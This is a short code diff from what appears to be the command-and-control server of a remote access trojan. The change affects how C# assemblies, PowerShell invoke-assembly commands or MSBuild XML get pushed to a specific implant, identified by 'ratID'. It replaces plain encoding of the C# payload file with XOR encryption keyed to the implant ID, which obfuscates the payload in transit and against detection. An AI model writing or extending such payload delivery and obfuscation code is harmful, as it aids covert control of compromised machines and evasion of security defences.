@@ -1025,7 +1025,8 @@ if __name__ == "__main__":
                                 if(types[ratID] == "ps1"):
                                     inp = "cs " + send_invoke_assembly(inp)
                                 elif(types[ratID] == "c#"):
-                                    inp = "cs " + encode_file(filepath) + " " + parse_c_sharp_args(inp)
+                                    with open(filepath, "rb") as fd:
+                                        inp = "cs " + xor_crypt_and_encode(fd.read(), ratID) + " " + parse_c_sharp_args(inp)
                                 else:
                                     inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
                             except:
